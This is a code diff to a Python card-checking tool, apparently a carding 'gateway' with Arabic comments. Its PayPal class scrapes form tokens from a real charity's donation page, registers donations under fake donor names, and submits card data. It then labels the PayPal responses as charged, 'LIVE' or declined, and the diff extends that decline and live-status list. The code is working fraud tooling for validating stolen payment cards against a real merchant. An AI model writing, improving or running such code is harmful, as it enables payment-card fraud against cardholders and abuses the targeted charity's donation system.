@@ -925,7 +925,7 @@ class StripeGateway2(StripeGateway1):
 
 # ==================== بوابة PayPal (مطابقة للكود الأصلي) ====================
 class PayPalGateway:
-    """PayPal Charge Gateway - مطابق للكود الأصلي"""
+    """PayPal Charge Gateway - مطابق تماماً للكود الأصلي @MUMIRU_BRO"""
     
     FIRST_NAMES = [
         "James", "Mary", "Robert", "Patricia", "John", "Jennifer", "Michael", "Linda",
@@ -987,8 +987,9 @@ class PayPalGateway:
         return "VISA"
     
     async def check_card(self, card_data: Dict) -> Tuple[bool, str]:
+        """فحص بطاقة عبر PayPal - مطابق تماماً للكود الأصلي"""
         try:
-            donor = self.random_donor()
+            # استخدام requests.Session() مثل الكود الأصلي
             session = requests.Session()
             session.verify = True
             ua_str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
@@ -1003,14 +1004,14 @@ class PayPalGateway:
             }
             
             # 1. Scrape tokens
-            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua_str}, timeout=30)
+            r = session.get("https://awwatersheds.org/donate/", headers={"User-Agent": ua_str}, timeout=20)
             html = r.text
             
-            hash_match = re.search(r'name="give-form-hash" value="(.*?)"', html)
-            if not hash_match:
-                hash_match = re.search(r'"base_hash":"(.*?)"', html)
-            if not hash_match:
-                return False, "❌ Failed to get form hash"
+            h = re.search(r'name="give-form-hash" value="(.*?)"', html)
+            if not h:
+                h = re.search(r'"base_hash":"(.*?)"', html)
+            if not h:
+                return False, "❌ Hash not found"
             
             pfx_match = re.search(r'name="give-form-id-prefix" value="(.*?)"', html)
             id_match = re.search(r'name="give-form-id" value="(.*?)"', html)
@@ -1019,12 +1020,14 @@ class PayPalGateway:
                 return False, "❌ Failed to get form data"
             
             tokens = {
-                'hash': hash_match.group(1),
+                'hash': h.group(1),
                 'pfx': pfx_match.group(1),
                 'id': id_match.group(1)
             }
             
             # 2. Register donation
+            donor = self.random_donor()
+            
             data = {
                 "give-honeypot": "",
                 "give-form-id-prefix": tokens['pfx'],
@@ -1046,7 +1049,7 @@ class PayPalGateway:
                 "give_ajax": "true"
             }
             
-            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=ajax_headers, data=data, timeout=30)
+            r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php", headers=ajax_headers, data=data, timeout=20)
             if r.status_code != 200:
                 return False, "❌ Donation registration failed"
             
@@ -1063,7 +1066,7 @@ class PayPalGateway:
             
             r = session.post("https://awwatersheds.org/wp-admin/admin-ajax.php",
                             params={"action": "give_paypal_commerce_create_order"},
-                            headers=ajax_headers, data=data, timeout=30)
+                            headers=ajax_headers, data=data, timeout=20)
             
             try:
                 order_data = r.json()
@@ -1195,7 +1198,7 @@ class PayPalGateway:
             )
             approve_text = r.text
             
-            # 6. تحليل النتيجة
+            # 6. تحليل النتيجة (مطابق للكود الأصلي)
             t = paypal_text.upper() if paypal_text else ""
             
             # نتائج CHARGED
@@ -1206,13 +1209,15 @@ class PayPalGateway:
             if '"APPROVEGUESTPAYMENTWITHCREDITCARD"' in t and '"ERRORS"' not in t and '"CARTID"' in t:
                 return True, "CHARGED!"
             
-            # نتائج LIVE
+            # نتائج APPROVED/LIVE
             if 'CVV2_FAILURE' in t:
                 return True, "CVV2 FAILURE (Card is LIVE)"
             if 'INVALID_SECURITY_CODE' in t:
                 return True, "CCN - Invalid Security Code (LIVE)"
             if 'INVALID_BILLING_ADDRESS' in t:
                 return True, "AVS FAILED (LIVE)"
+            if 'EXISTING_ACCOUNT_RESTRICTED' in t:
+                return True, "Account Restricted (LIVE)"
             if 'INSUFFICIENT_FUNDS' in t:
                 return True, "Insufficient Funds (LIVE CARD)"
             
@@ -1221,20 +1226,47 @@ class PayPalGateway:
             declines = [
                 ('DO_NOT_HONOR', 'Do Not Honor'),
                 ('ACCOUNT_CLOSED', 'Account Closed'),
+                ('PAYER_ACCOUNT_LOCKED_OR_CLOSED', 'Account Locked/Closed'),
                 ('LOST_OR_STOLEN', 'LOST OR STOLEN'),
                 ('SUSPECTED_FRAUD', 'SUSPECTED FRAUD'),
                 ('INVALID_ACCOUNT', 'INVALID ACCOUNT'),
+                ('REATTEMPT_NOT_PERMITTED', 'REATTEMPT NOT PERMITTED'),
+                ('ACCOUNT_BLOCKED_BY_ISSUER', 'ACCOUNT BLOCKED BY ISSUER'),
+                ('ORDER_NOT_APPROVED', 'ORDER NOT APPROVED'),
+                ('PICKUP_CARD_SPECIAL_CONDITIONS', 'PICKUP CARD'),
+                ('PAYER_CANNOT_PAY', 'PAYER CANNOT PAY'),
+                ('GENERIC_DECLINE', 'GENERIC DECLINE'),
+                ('COMPLIANCE_VIOLATION', 'COMPLIANCE VIOLATION'),
+                ('TRANSACTION_NOT_PERMITTED', 'TRANSACTION NOT PERMITTED'),
+                ('PAYMENT_DENIED', 'PAYMENT DENIED'),
+                ('INVALID_TRANSACTION', 'INVALID TRANSACTION'),
+                ('RESTRICTED_OR_INACTIVE_ACCOUNT', 'RESTRICTED/INACTIVE ACCOUNT'),
+                ('SECURITY_VIOLATION', 'SECURITY VIOLATION'),
+                ('DECLINED_DUE_TO_UPDATED_ACCOUNT', 'DECLINED - UPDATED ACCOUNT'),
+                ('INVALID_OR_RESTRICTED_CARD', 'INVALID/RESTRICTED CARD'),
                 ('EXPIRED_CARD', 'EXPIRED CARD'),
+                ('CRYPTOGRAPHIC_FAILURE', 'CRYPTOGRAPHIC FAILURE'),
+                ('TRANSACTION_CANNOT_BE_COMPLETED', 'CANNOT BE COMPLETED'),
+                ('DECLINED_PLEASE_RETRY', 'DECLINED - RETRY LATER'),
+                ('TX_ATTEMPTS_EXCEED_LIMIT', 'TX ATTEMPTS EXCEED LIMIT'),
             ]
             
             for keyword, msg in declines:
                 if keyword in combined:
                     return False, f"{msg}"
             
+            # محاولة تحليل JSON
             try:
                 rj = json.loads(paypal_text)
                 if "errors" in rj:
                     return False, rj["errors"][0].get("message", "Unknown")
+            except:
+                pass
+            
+            try:
+                rj = json.loads(approve_text)
+                if rj.get("data", {}).get("error"):
+                    return False, str(rj["data"]["error"])
             except:
                 pass
             
